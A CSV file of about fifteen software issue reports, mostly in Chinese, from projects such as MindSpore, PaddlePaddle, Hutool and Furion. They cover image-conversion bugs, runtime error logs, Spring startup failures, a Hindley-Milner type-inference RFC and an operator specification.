title,text
png转jpg，白色背景问题,"使用的JDK版本和Hutool版本 1.8；4.5.16 png转到jpg，图片变成了黑色。由于原图字也是黑色，导致转换后无法看到内容。如图 // bGr.drawImage(img, 0, 0, Color.WHITE,null);   <code>: public static BufferedImage copyImage(Image img, int imageType) { final BufferedImage bimage = new BufferedImage(img.getWidth(null), img.getHeight(null), imageType); final Graphics2D bGr = bimage.createGraphics(); bGr.drawImage(img, 0, 0, null); //改这里 bGr.dispose(); return bimage; }"
在本地报表插入图片 上传到服务器，图片看不到,版本号：1.4.0-beta   <code>: 在本地报表插入图片 上传到服务器，图片看不到
reopen LinkChecker for checking URLs,LinkChecker is used for checking for broken links in websites. But it is disabled in travis/build_doc.sh#L18 We should reopen it.   <code>: #linkchecker doc/en/html/index.html #linkchecker doc/cn/html/index.html
动态表名,"当前使用版本 以前版本使用方式 我只有单独两张表需要分库分表，这个用3.4.3.3应该如何优雅的实现   <code>: dynamicTableNameInnerInterceptor.setTableNameHandler((sql, tableName) -&gt; { Map&lt;String, Object&gt; paramMap = RequestDataHelper.getRequestData(); paramMap.forEach((k, v) -&gt; (k + """" + v)); String year = ""_2018""; int random = new Random().nextInt(10); if (random % 2 == 1) { year = ""_2019""; } return tableName + year; }); interceptor.addInnerInterceptor(dynamicTableNameInnerInterceptor); HashMap&lt;String, TableNameHandler&gt; map = new HashMap&lt;String, TableNameHandler&gt;(); map.put(""user_daily_record"", new DaysTableNameParser()); map.put(""user_consume_flow"", new IdModTableNameParser(10)); dynamicTableNameInnerInterceptor.setTableNameHandlerMap(map);"
"[CT][MS][parallel]ps, embedding_heterogeneous, raise runtime error",": /device ascend : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel cd /home/wys/code/MindSporeTest/parallel/parameter_server bash ../../share/parallel/tool/pytest_parallel_ps.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -n 3 -f test_parameter_server_basic_data_parallel.py -t test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel ps, embedding_heterogeneous, raise runtime error only run ps, or only run no ps, case pass, but , run together , case fail case pass or info: 0x2227b, ifu error info: 0x3cb57bfd6f580, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.605 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 27, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x9ce31d7, mte error info: 0x2227b, ifu error info: 0x3bb33ffbe7b80, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.615 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 28, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064280, vec error info: 0x1fb1cffe, mte error info: 0x2227b, ifu error info: 0x3b9ff37ce3f00, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.624 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 29, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064300, vec error info: 0xdfdebd5, mte error info: 0x2227b, ifu error info: 0x17da4325f7e80, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.638 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 30, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x1ffeffa7, mte error info: 0x2227b, ifu error info: 0x2bc7a7bef8780, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.648 [device_error_proc.cc:408]129140 ProcessCoreErrorInfo:The error from device(0), serial number is 2, there is an aicore error, core id is 31, error code = 0x800000, error string = The DDR address of the MTE instruction is out of range. dump info: pc start: 0x1000108040064000, current: 0x108040064318, vec error info: 0x1def15ff, mte error info: 0x2227b, ifu error info: 0x3ff3bef6f7680, ccu error info: 0x0, cube error info: 0x53, biu error info: 0x0, aic error mask: 0x65000200d000288, para base: 0x108040021000. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.726 [device_error_proc.cc:607] 129140 ProcErrorInfo: finished to process device error info, retCode=0. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.737 [engine.cc:908] 129140 ReportExceptProc: excptCallBack_ is null. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.746 [stream.cc:877] 129140 TryDelRecordedTask: del public task from stream, stream_id=18, tailTaskId=1, delTaskId=1, head=2, tail=3 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.756 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=7, serial_id=1 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.765 [logger.cc:1361] 129140 TaskFinished: device_id=0, stream_id=18, task_id=1, task_type=13,task_finish_num=1314 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.775 [pool.cc:452] 129140 GetItemBySerial: stream_id=17, task_id=35, serial_id=32 [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.874 [task.cc:692]129140 PrintErrorInfo:Aicore kernel execute failed, device_id=0, stream_id=17, report_stream_id=18, task_id=32, fault kernel_name=BNTrainingReduceGrad_1942374668486120580_0__kernel0, func_name=BNTrainingReduceGrad_1942374668486120580_0__kernel0, program id=22, hash=7572733580691254732. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.887 [task.cc:2180]129140 ReportErrorInfo:model execute error, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.895 [task.cc:2162]129140 PrintErrorInfo:model execute task failed, device_id=0, model stream_id=18, model task_id=1, model_id=1, first_task_id=65535 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.945 [task.cc:100] 129140 TaskFailCallBack: rtCode=0x7150050,[the model stream execute failed], errorTaskId=32, errorStreamId=17 [INFO] HCCL(127966,python3.7):2021-08-10-20:59:02.552.023 [task_exception_handler.cc:186][127966][129140]stream not found. the fail task is not from HCCL. streamid[17] [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.037 [pool.cc:429] 129140 GetTaskId: stream_id=18, task_id=7, serial_id=1 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.047 [engine.cc:1046] 129140 WaitNotify: Notify: count=2, idx=1, stream_id=18, task_id=2, type=0, error=0, payLoad=0 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.057 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=8, serial_id=2 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.064 [engine.cc:1466] 129140 ProcessReport: report receive, stream_id=18, task_id=2. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.079 [stream.cc:877] 129140 TryDelRecordedTask: del public task from stream, stream_id=18, tailTaskId=2, delTaskId=2, head=3, tail=3 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.087 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=8, serial_id=2   <code>: ''' TEST_SUMMARY:test net with embedding_lookup ps and conv2d heterogeneous, opt=adam, target=CPU ''' def test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel(): context.set_context(enable_sparse=True) context.set_context(save_graphs=True) dataset = FakeData(size=1024, batch_size=32, image_size=(3, 32, 32), num_classes=30720, use_parallel=True) fact = NetFactory(dataset=dataset, conv_yg=True, embedding_ps=True, opt_yg=True, target='CPU', sparse=True, neg_index=False) fact.part_cmp()"
tensor draft for review,"This is only a draft of tensor implementation for review and it has not been fully tested. So DO NOT MERGE THIS PR. Comments are welcome if you have any idea or suggestion for my code. In addition, during my coding work I came up with several other questions that need to be discussed: Do we need to rename functions from Majel (such as member functions of and ) to follow google c++ style? In ported Majel code, we use glog to do asserting jobs, while in the other part of refactored Paddle we plan to use our own macro(). Are we going to unify them? is removed in current tensor design. Is that going to be a problem?   <code>: DDim Place paddle/platform/assert.h Stride"
有没有新手和我一样项目启动不起来？,"原始启动报错如下： 加上注解@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})后报错如下：   <code>: Description: Failed to configure a DataSource: 'url' attribute is not specified and no embedded datasource could be configured. Reason: Failed to determine a suitable driver class Action: Consider the following: If you want an embedded database (H2, HSQL or Derby), please put it on the classpath. If you have database settings to be loaded from a particular profile you may need to activate it (no profiles are currently active). Disconnected from the target VM, address: '127.0.0.1:52511', transport: 'socket' Description: Field messageTemplateDao in com.java3y.austin.controller.MessageTemplateController required a bean of type 'com.java3y.austin.dao.MessageTemplateDao' that could not be found. The injection point has the following annotations: - @org.springframework.beans.factory.annotation.Autowired(required=true) Action: Consider defining a bean of type 'com.java3y.austin.dao.MessageTemplateDao' in your configuration. Disconnected from the target VM, address: '127.0.0.1:52462', transport: 'socket' Process finished with exit code 1"
Cluster train task dispatching and task queues reconsideration,"According to https://github.com/PaddlePaddle/Paddle/blob/develop/doc/design/dist/README.md#task-queue we need to determine whether a task is finished or timeouted. The ""Pending Queue"" seems not suitable for this, because trainers may update the task status by . A key-value store may be a good choice? So we may only need two queues: TODO queue and Done queue, and another k-v store. Below shows the master process pseudo code: If we start a redis instance(container) in the master pod when using kubernetes, and configure redis to use ""AOF"" to persistent every write(use distributed filesystem, mounted on the pod), we can use redis as both queue and k-v store. When master pod fails, restarts the master will restore redis data from ""AOF"" file to continue task dispatching. Thanks for @Yancey discussed with me with these thoughts.   <code>: task-id for p in range(num_pass): put_all_task(todo_queue) while 1: finished, timeouts = check_task_stats() if finished: push(done_queue, finished) if timeouts: # FIXME: add slow node functions append(todo, timeouts) if task_all_done(): break sleep(1)"
[ST][MS][NET][fasterrcnn][GPU]loss  print 'nan' ,Use this template for r[ST][MS][NET][fasterrcnn]loss sometimes print 'nan'eporting a bug fasterrcnn 在GPU（A100）训练时loss打印nan / 硬件环境: /device GPU/ : -- MindSpore version :r1.7.0 B120 commit_id:4be97129 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_fasterrcnn_gpu_train_check_fps_1p_0001 get code from models sh run_distribute_train_gpu.sh loss正常打印 备注 提给潘峰峰   <code>: 146 s | epoch: 1 step: 50 total_loss: 0.78345 lr: 0.006175 152 s | epoch: 2 step: 50 total_loss: 1.04738 lr: 0.009925 158 s | epoch: 3 step: 50 total_loss: 1.18861 lr: 0.013675 164 s | epoch: 4 step: 50 total_loss: 0.42527 lr: 0.017425 169 s | epoch: 5 step: 50 total_loss: 1.00825 lr: 0.021175 175 s | epoch: 6 step: 50 total_loss: 1.58153 lr: 0.024925 181 s | epoch: 7 step: 50 total_loss: nan lr: 0.028675 187 s | epoch: 8 step: 50 total_loss: nan lr: 0.032425 193 s | epoch: 9 step: 50 total_loss: nan lr: 0.036175 200 s | epoch: 10 step: 50 total_loss: nan lr: 0.039925 206 s | epoch: 11 step: 50 total_loss: nan lr: 0.040000 212 s | epoch: 12 step: 50 total_loss: nan lr: 0.040000 218 s | epoch: 13 step: 50 total_loss: nan lr: 0.040000 224 s | epoch: 14 step: 50 total_loss: nan lr: 0.040000 230 s | epoch: 15 step: 50 total_loss: nan lr: 0.040000 236 s | epoch: 16 step: 50 total_loss: nan lr: 0.040000 243 s | epoch: 17 step: 50 total_loss: nan lr: 0.040000 249 s | epoch: 18 step: 50 total_loss: nan lr: 0.040000 255 s | epoch: 19 step: 50 total_loss: nan lr: 0.040000 261 s | epoch: 20 step: 50 total_loss: nan lr: 0.040000
远程图片下载在有类似src属性时不能完成下载,"例如这篇文章：http://wf.wenming.cn/wfwlwmcb/201906/t20190604_5887051.shtml 图片处代码： 里面含有oldsrc属性，点击远程图片下载未能正常工作，在编辑源码里把oldsrc=""W020190605390138630908.jpg""去掉，功能正常。猜想是不是在src的匹配上不够精准？   <code>: &lt;img width=""600"" alt="""" oldsrc=""W020190605390138630908.jpg"" complete=""complete"" src=""http://wf.wenming.cn/wfwlwmcb/201906/W020190605390138630908.jpg"" style=""margin: 0px; padding: 0px; border: 0px; vertical-align: bottom; max-width: 85%;""&gt;"
Fix read_source.md,Optimizer is not a part of fluid. The was missing.   <code>: paddle::platform
实体监听IEntityChangedListener 的 严重问题 2：监听中保存其他实体，该监听也会无限循环,"Furion 版本号 2.18.7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 当我在A实体监听事件OnChanging中 调用增删改B实体 的方法，并在该方法中执行 _rep.SaveNow() 时，也会无限循环的执行A实体监听OnChanging事件 【我也受益于ABP框架。难道Furion框架的实体监听的逻辑与abp不一样？】 无 public class SysOrgListener1 : IEntityChangedListener { public class SysOrgManager:ITransient { private readonly IRepository _rep; private readonly IRepository _userRep; public SysOrgManager(IRepository rep,IRepository userRep) { _rep = rep; _userRep=userRep; } public void OnChanging(SysOrg entity, EntityState state) { _userRep.SaveNow(); } } Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 保存B是保存B，为什么会无限的执行A实体监听事件？ 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: public void OnChanging(SysOrg entity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanging(entity, state); } public void OnChanged(SysOrg newEntity, SysOrg oldEntity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanged(newEntity, oldEntity, state); } }"
Create a Sub-Pipeline for Hindley Milner (HM)-based Type Inference,"RFC Create a Sub-Pipeline for Hindley Milner (HM)-based Type Inference Background, Current Challenges Currently, we use an Abstract Interpreter (AI)-based type inference algorithm, and face a lot of problems. Complexity: Theoretical limitation on optimizing for an Abstract Interpreter. State-of-the-art theoretical complexity for a 0CFA analysis (i.e. the most basic analysis to determine which function a variable is referring to, which corresponds to <em>ExecuteMultipleEvaluators</em> in the current implementation) is O(n^3). To optimize the current routine, we have to resort to software engineering effort or widening. Adhoc Implementation and Adhoc Specification: The deficiencies are illustrated in details in this issue. Difficult to extend to support dynamic shape static analysis: In the context of (runtime-)dynamic shape analysis, it is reasonable to assume that a proper fixed-point computation (or a more delicate and complex one) is needed to prevent (top of lattices) from appearing everywhere. However, current AI lacks a proper fixed-point computation and is already suffering from long compile time. In the dynamic shape context, the analysis needs to be able to handle symbolic values. However, current AI will simply broaden a symbolic value to . To properly support such analysis, one would require something similar to a SMT solver to perform automatic theorem proving (e.g., the shape of a tensor is a symbolic value times symbolic value ) instead of using abstract interpretation. Overly Complicated Implementation : Due to the current AI algorithm being unsound (thus lacking proper academic references), it tries to flatten the lattice and directly lifts to the 'top' of the lattice to avoid the requirement of fixed-point computation. This fundamentally defeats the purpose of using Abstract Interpretation. In the current case, express-ability is limited and is already very close to a HM-system, because over-approximation happens causing everything to be lifted to float. Further, there is no untagged union support. yet the complexity is much higher than HM's unification based algorithm; and imposes a lot of knowledge burden for future developers due to the unneeded abstraction in the current code-base. Essentially, since the current design does not make proper use of a lattice (e.g. no lattice bottom), then an Abstract Interpretation based solution is completely unnecessary. It makes the code-base overly complicated. Problem with the current AI-based system: It is an Adhoc Implementation: To address the lack of a proper fixed-point computation, one must look to the closest correct algorithm for a solution: Abstracting Definitional Interpretater. The design and software engineering skills needed to implement a proper monadic-style ADI or widening (widening the store) is challenging due to the lack of practical expertise. Further software engineering challenges lie ahead when implementing the widening operators in the existing code-base. It is likely that with the existing code-base, one may fallback to a case-by-case yet error-prone patch-style solution, making any future extension such as user-customized data-type, extremely difficult. AI-based algorithm does not have strong support for error-message reporting. Our proposal We propose to open up a sub-pipeline that uses the widely-used and mature Hindley-Milner (HM) unification-based type inference algorithm as the base framework. HM type system has been adopted by industries. With Typeclass as an extension, we can easily type the adhoc-polymorphic terms such as the addition or subscription operators, and even literal numbers. (e.g. list or tuple concat, integer or double addition, list or tuple getitem, literal number '3' can be interpreted as an integer or a float). Our Design Constraint Generation/Solving We plan to create a new pipeline, which will reuse some parts of the , and and reuse most of the other passes. We then attach our own passes and at the place where once was and . This new pipeline will only be triggered when a user at the Python level chooses as decoration. introduces primitives and strings as symbols, which are unfolded by . This now directly feeds to the HM inference algorithm. With the power of Polymorphism and Typeclass, we can achieve the following. For example, primitives . is a typeclass, which we will describe in details in another RFC. The essence here is to introduce an adhoc-polymorphism/function overloading mechanism (similar to Java's Interface, Rust's trait) using typeclass. After primitives are all typed, we proceed to the classical Constraint Generation/Solving for the HM algorithm, with the presence of Generalization/Instantiation (to handle polymorphism). Constraint Generation and Solving are separated in code, but Generation will call Solving during the run. We can make sure in our Constraint Generation, unlike an AI-based algorithm, every AnfNode is visited once and only once. Every graph is also visited once only. The main algorithm is as follows: Constraint Generation on grA deal with scoping information -- e.g. the current graph grA's parameters; and those sub-graphs (that are used, graphs_used) (avoiding (mutual) recursion) -- are assigned type variables for future constraint generation. enter each of the sub-graphs, using [1.Constraint Generation] recursively on each of the sub-graph solve the generated constraints, update the solution (by using substitution) GENERALIZING the sub-graphs solved-type, and Use the generalized type to perform constraint generation on grA.return_ Get the result of the above and solve the constraints We carefully avoid visiting graph/function through the constant nodes -- the type information for each graph/function primitive that a constant node points to is already ready during step 2, since step 1 has already handled all the dependent sub-graphs. This is the key we will visit each AnfNode only once (and where the almost linear time complexity comes from). We also need to pay attention to the interaction with the book keeping of typeclasses in this context, although trivial. Data representation for HM types We create a namespace called 'HM' to disambiguate the HM Types with the existing Abstract Value/Types. We use classical Algebraic Data Type Encoding (as we did with AnfNode) -- we create class , and class and every possible new type construct will be inherited from it, including Type Constructions such as , , , and so on. For each type there will be a series of auxiliary information such as Kind. We create , and in the HM namespace as IRMutator/IRVisitor in a visitor pattern style, which will be defined to support the above defined recursive structure in in a extensible manner. We can also make support the default C++ container, such as dictionary mapping (where substitution only happens on the co-domain), List/Vector, Tuple (one by one substitution), C++'s function (substitution happens on co-domain). Type Scheme also inherits from class and supports instantiate. Primitive Register -- Resource Manager We separately create a resource manager class focusing on handling the Primitive Declarations, so that we know what parts of interface is essential. At some later stage, this is to be integrated with the Resource Manager. Type Attachment After Type Inference is done, we have a mapping from each AnfNode to a type, each GraphNode to a typescheme; at that stage, a linear traversal occurs to attach each node with its type. Advantages: Our proposal has the following advantages: Lower Complexity: During constraint generation phase of HM, each graph/function and each AnfNode will only be visited once; and it is empirically well-known that HM acts almost linear in the real industrial sceanrio. Comparing to the current AI solution -- each AnfNode must be visited multiple times when the parent graph is invoked with different types; or just a single type that is inside recursion. Patching Current Concrete Problems: We freely allow user to express the scenario where Literal Number can be interpreted as Int and Double; we don't require halting of the program and also we accept the super-set of the current implementation and at the same time we can support Algebraic Datatype and thus Union in the future. Simpler Code Structure: The algorithm is compositional and simple to understand. Constraint Generation + Solving + Generalization are the essence of this algorithm. We also don't introduce useless and vacuous abstraction, leading to a more compact code-base. Possible Extension to Dynamic Shape Static Analysis : Liquid Type System gives a good framework for that. Mature Academic Reference/Industrial Experience: We also have a clear specification and formal definition of the system due to the formal research on HM's type system (a subpart of System F). Polymorphism is directly supported and user can declare a function with polymorphism if he wants, that makes polymorphism a feature in the Hindley-Milner system, while current AI-based solution handles polymorphism with the simulation of code duplication. HM is also the base framework for many programming languages we can refer to Apart from that, we also have the following advantages: HM is an unification-based algorithm, which means there is no merge during the ""fixed-point"" computation, but only unification. We can get-away with the error-prone case by case analysis of merging different types that happens in AI-based algorithm. There is no 'Any' in HM. With support of tagged union we can support all the cases untagged union explicitly and in a user-aware manner. Error-message reporting and other user-friendly features are researched used in industrial cases. HM is possible for modular inference because of the existence of polymorphism, and the type of a function is solely decided by its definition instead of the case where AI-based type inference will partially depend on the input type. It opens the possibility that function dispatch (for function overloading) can be achieved without monomorphization (by pushing dispatching into runtime) thus avoid code bloat. (Note that code size is heavily related to the compile time length.) Meanwhile, we don't need special backend primitive in VM like HM also opens up future possibility of other extensions -- Effect System, Liquid Type, Open Union, Pattern-Matching/Algebraic Datatype and so on. Trail No. Task Description Related Issue(URL) 1 Bugs in the Abstract Interpreter (AI) based Inference Engine link 2   <code>: Any AnyValue n m Parse Symbol Resolve HM-Inference Typeclass-Elimination Symbol Resolve Abstract Specialize @msfunction.HM Parse Symbol Resolve subtract :: Num T=&gt; (T,T) -&gt; T Num Type TypeNode TTuple TArrow TInt TList Substitute FreeVariable Generalize Type Substitute Type getattr"
Unit test for `lookup_table` OP with SelectedRows in grad.,"I've added support for BF16 data type in PR, however I can't find a way to test the grad calculations with ""W"" input as . Does this part of code checks also grad? Could you advise how to test grad calculations with ""W"" input as ?   <code>: SelectedRows SelectedRows"
Execution frequencies in inlined code cannot be accurate under --profileUse,"A good example is pr86231.c: The cfg of foo(): The path of execution in foo() is different in each invocation. It is impossible to know which invocation takes which path. The current strategy uses scaling, implemented in maple_ir/mir_nodes.cpp:BlockNode::CloneTreeWithFreqs(), in which numer is the frequency of the call site and denom is the entry frequency of the function being cloned. After the scaling, which is division by 8 in this example, the frequencies in the inlined body become inconsistent.   <code>: #define ONE ((void *) 1) #define TWO ((void *) 2) __attribute__((noipa)) int foo (void *p, int x) { if (p == ONE) return 0; if (!p) p = x ? TWO : ONE; return p == ONE ? 0 : 1; } int v[8]; int main () { if (foo ((void *) 0, 0) != 0 || foo ((void *) 0, 1) != 1 || foo (ONE, 0) != 0 || foo (ONE, 1) != 0 || foo (TWO, 0) != 1 || foo (TWO, 1) != 1 || foo (&amp;v[7], 0) != 1 || foo (&amp;v[7], 1) != 1) abort (); return 0; }"
"[CT][MS][switch_layer]Layers' output has different dtype, no exception is raised",": GPU /device gpu : -- MindSpore version : vm+GPU -- Python version : -- OS platform and distribution : -- GCC/Compiler version : No exception is raised   <code>: def test_parser_switch_layer_outputs_diff_dtype(): class Cast(Cell): def __init__(self, dtype): super().__init__() self.op = P.Cast() self.dtype = dtype def construct(self, x): y = self.op(x, self.dtype) return y+y class SwitchNegNet(Cell, MetaFactory): def __init__(self, funcs): super().__init__() MetaFactory.__init__(self) self.funcs = funcs self.op = P.Neg() def construct(self, i, inputs): x = self.funcs[i](inputs) x= self.op(x) return x func1 = TwoLayerReLU() func2 = Cast(ms.int32) funcs = (func1, func2) net = SwitchNegNet(funcs) input = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(0, mstype.int32) with pytest.raises(ValueError) as err: netout = net(i, input)"
gateway聚合文档访问doc.html报403,启动类没有加@EnableSwagger2，因为加了会启动报错，其他代码都是按照https://xiaoym.gitee.io/knife4j/action/springcloud-gateway.html#_2-1-3-1-pom%E5%BC%95%E5%85%A5%E7%9B%B8%E5%85%B3jar%E5%8C%85来写的   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.5.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!--服务注册/发现中心依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;*&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-ui&lt;/artifactId&gt; &lt;version&gt;2.0.9&lt;/version&gt; &lt;/dependency&gt;
【众智】【计算-AICPU开发】LayerNormGradGrad,"AICPU算子接入 LayerNormGrad算子的反向，未发现对标算子。LayerNorm算子是对Channel方向做归一化。 接口目录：mindspore/ops/operations/_grad_ops.py x LayerNorm算子的输入x dy LayerNorm算子的反传梯度值 variance LayerNorm算子的输出，x的方差 mean LayerNorm算子的输出，x的均值 gamma LayerNorm算子的输入gamm d_dx LayerNormGrad的输出dx的反向梯度 d_dg LayerNormGrad的输出dg的反向梯度 d_db LayerNormGrad的输出db的反向梯度 sopd_dy x的梯度输出 sopd_mean dy的梯度输出 sopd_gamma Gamma的梯度输出 对应底层算子 对应底层AICPU算子LayerNormGradGrad Classify Name Type Type Range Required Format INPUT x fp16,fp32 TRUE INPUT dy fp16,fp32 TRUE INPUT variance fp16,fp32 TRUE INPUT mean fp16,fp32 TRUE INPUT gamma fp16,fp32 TRUE INPUT d_dx fp16,fp32 TRUE INPUT d_dg fp16,fp32 TRUE INPUT d_db fp16,fp32 TRUE OUTPUT sopd_x fp16,fp32 TRUE OUTPUT sopd_dy fp16,fp32 TRUE OUTPUT sopd_gamma fp16,fp32 TRUE 标杆接口参考 3. 异常处理 4. 算子反向 无反向   <code>: class LayerNormGradGrad (Primitive):"
